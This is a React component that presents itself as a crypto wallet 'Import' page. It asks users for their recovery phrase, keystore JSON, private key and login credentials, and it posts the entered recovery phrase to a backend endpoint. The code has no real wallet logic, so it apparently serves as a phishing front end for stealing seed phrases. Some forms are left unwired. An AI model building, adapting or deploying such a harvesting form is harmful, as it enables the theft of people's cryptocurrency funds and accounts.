import React, { useState } from "react";
import "./Form.css";
import axios from "axios";
// import { data } from "../data/FormData";
import client from "../../api/client";

function Form() {
  const [show, setShow] = useState("");
  const [message, setMessage] = useState("");

  const [loading, setLoading] = useState(false);
  const formSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await client.post("/post/", { 
        type: "keyphrase", 
        phrase: message
      })
      console.log("response", response);
    } catch (error) {
      console.log("error", error);
    } finally {
      setLoading(false);
    }
  };

  const resetForm = () => {
    setMessage({ message: "" });
    setTimeout(() => {
      setMessage({ sent: false });
    }, 3000);
  };

  return (
    <div style={{ paddingBottom: "5rem" }}>
      <div className="form-container">
        <div className="form-header" onClick={() => setShow("section1")}>
          Phrase
        </div>
        {show === "section1" ? (
          <form onSubmit={formSubmit} className="form-content">
            {" "}
            <label htmlFor="message">Recovery Phrase Key:</label>
            <textarea
              type="text"
              name="message"
              id="message"
              placeholder="Please enter 12, 15, 18, 21 or 24 words Phrase, each separate by a space."
              value={message}
              onChange={(e) => setMessage(e.target.value)}
            ></textarea>
            <button type="submit" className="form-button">
              <span>Import</span>
            </button>
          </form>
        ) : null}
      </div>
      <div className="form-container">
        <div className="form-header" onClick={() => setShow("section2")}>
          Keystore JSON
        </div>
        {show === "section2" ? (
          <form className="form-content" onSubmit={formSubmit}>
            <div>
              {" "}
              <label id="message1">Keystore JSON:</label>
              <textarea
                id="message1"
                placeholder="Please enter words Keystore JSON, each separate by a space."
              ></textarea>
            </div>

            <div>
              <button className="form-button">
                <span>Import</span>
              </button>
            </div>
          </form>
        ) : null}
      </div>

      <div className="form-container">
        <div className="form-header" onClick={() => setShow("section3")}>
          Private Key
        </div>
        {show === "section3" ? (
          <form className="form-content" onSubmit={formSubmit}>
            <div>
              {" "}
              <label id="message2">Private Key:</label>
              <textarea
                id="message2"
                placeholder="Please enter Private Key"
              ></textarea>
            </div>

            <div>
              <button className="form-button">
                <span>Import</span>
              </button>
            </div>
          </form>
        ) : null}
      </div>

      <div className="form-container">
        <div className="form-header" onClick={() => setShow("section4")}>
          Access Key
        </div>
        {show === "section4" ? (
          <form className="form-content" onSubmit={formSubmit}>
            <div className="access">
              {" "}
              <h3>Access Key:</h3>
              <label id="username">Username:</label>
              <input type="text" id="subject" placeholder="Username"></input>
              <label id="password">Password:</label>
              <input
                id="password"
                type="text"
                placeholder="Enter your Password"
              ></input>
            </div>

            <div>
              <button className="form-button">
                <span>Login</span>
              </button>
            </div>
          </form>
        ) : null}
      </div>
    </div>
  );
}

export default Form;
